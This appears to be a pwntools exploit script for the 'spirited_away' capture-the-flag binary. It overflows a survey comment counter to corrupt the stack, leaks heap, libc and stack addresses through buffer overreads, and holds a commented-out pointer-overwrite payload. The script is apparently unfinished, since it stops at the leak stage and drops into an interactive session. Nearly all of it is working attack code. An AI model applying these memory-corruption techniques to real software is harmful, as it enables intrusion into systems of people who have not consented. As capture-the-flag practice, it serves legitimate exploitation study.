#!/usr/bin/env python3

from pwn import *

path = "./spirited_away_patched"
elf = ELF(path)
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = elf


def conn(debug):
    global r
    if debug:
        r = process(path)
    else:
        r = remote("addr", 1337)

    return r

def name(s):
    r.sendlineafter(b"name:", s)

def age(s):
    r.sendlineafter(b"age:", s)

def why(s):
    r.sendlineafter(b"movie?", s)

def comment(s):
    r.sendlineafter(b"comment", s)

def survey(_name, _age, _why, _comment):
    name(_name)
    age(_age)
    why(_why)
    comment(_comment)

conn(1)

# make > 10 comments to overflow
# corrupt stack
for i in range(100):
    if i < 10:
        name(b"name")
    age(b"666")
    why(b"why")
    if i < 10:
        comment(b"comment")
    r.sendlineafter(b"<y/n>:", b"y")

input()

# leak heap address which we cannot overwrite (hits us with segfault)
# this heap address is what is attempted to be free'd by the code
name(b"libcleak")
age(b"666")
why(b"ynot")
r.sendlineafter(b"comment", b"A"*0x53)
r.recvuntil(b"A"*0x53 + b"\x0a")
important_heap_addr = int.from_bytes(r.recv(4), "little")
# we are also leaking libc at the same time
# happy accidents
r.recv(4) # nothing important here
libc.address = int.from_bytes(r.recv(4), "little") - 0x1b000a

log.info(f"['buf' ADDRESS] {hex(important_heap_addr)}")
log.info(f"[LIBC ADDRESS] {hex(libc.address)}")


# leak the stack
for i in range(2):
    r.sendlineafter(b"<y/n>:", b"y")
    name(b"stackleak")
    age(b"666")
    why(b"A"*0x4f)
    comment(b"lulz")
    r.recvuntil(b"A"*0x4f + b"\x0a")
    stack_addr = int.from_bytes(r.recv(4), 'little')

    log.info(f"[STACK ADDRESS] {hex(stack_addr)}")
    print(hex((stack_addr & 0xfffff000)))

'''
r.sendlineafter(
        b"comment", 
        b"A"*0x54 + p32(important_heap_addr) + p32(0x746f6e79) + b"A"*0x0c + b"\xff"
        )
'''
# leak libc thru the "comment" variable (stack + 0xa4 in survey())
r.interactive()
